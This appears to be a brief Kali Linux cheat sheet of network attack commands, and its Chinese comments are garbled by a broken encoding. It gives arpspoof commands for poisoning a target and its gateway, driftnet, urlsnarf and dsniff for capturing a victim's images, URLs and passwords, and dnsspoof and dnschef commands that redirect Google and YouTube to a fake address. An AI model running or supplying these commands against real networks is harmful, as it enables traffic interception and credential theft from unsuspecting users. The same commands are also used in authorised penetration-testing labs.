###ARP��ƭ###

#########################################################

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 10.10.10.133 -r 10.10.10.1


#########################################################

###driftnet,urlsnarf,dsniff����###

# ʵʱ��ʾͼƬ
 root@kali:~# driftnet -i eth0 
 # -a ��Ҫ����Ļ����ʾͼ�񣬶��ǽ��䱣�浽һ����ʱĿ¼�У����ڱ�׼����Ϲ������ǵ����ơ�
 # -d ָ��Ŀ¼
 # -s ץȡ����
 # driftnet -i eth0 -a -d testdir -s

 # ץȡ URL
 # webspy -i eth0 10.10.10.133
 # urlsnarf -i eth0

 # ��̽����
 # -m���Զ�Э����
 dsniff -i eth0 -m

###dns ��ƭ###

#########################################################
dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts

 root@kali:~# dnschef --fakeip=10.10.10.2 --fakedomains=www.google.com,www.youtube.com --interface 10.10.10.131 -q
 root@kali:~# netstat -tulnp | grep 53

#########################################################





